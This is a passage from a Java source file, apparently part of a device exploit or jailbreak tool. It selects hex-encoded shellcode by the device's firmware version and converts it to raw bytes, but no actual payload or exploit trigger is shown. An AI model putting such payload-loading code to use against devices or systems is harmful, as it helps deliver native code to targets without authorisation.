                String firmware = getFirmwareVersion();
                String shellcode = (String) shellcodeData.get(firmware);
                if (shellcode == null || shellcode.length() == 0) {
                        return new byte[0];
                }
                return hexToBinary(shellcode);
        }

        public static boolean hasShellcodeForCurrentFirmware() {
                String firmware = getFirmwareVersion();
                return shellcodeData.containsKey(firmware);
        }

        private static byte[] hexToBinary(String hex) {
                byte[] result = new byte[hex.length() / 2];
                for (int i = 0; i < result.length; i++) {
                        int index = i * 2;
                        int value = Integer.parseInt(hex.substring(index, index + 2), 16);
                        result[i] = (byte) value;
                }
                return result;
        }

        // Initialize method to set firmware from Helper
        public static void initializeFromHelper() {
                String helperFirmware = Helper.getCurrentFirmwareVersion();
                if (helperFirmware != null) {
                        currentFirmware = helperFirmware;
                }
        }
}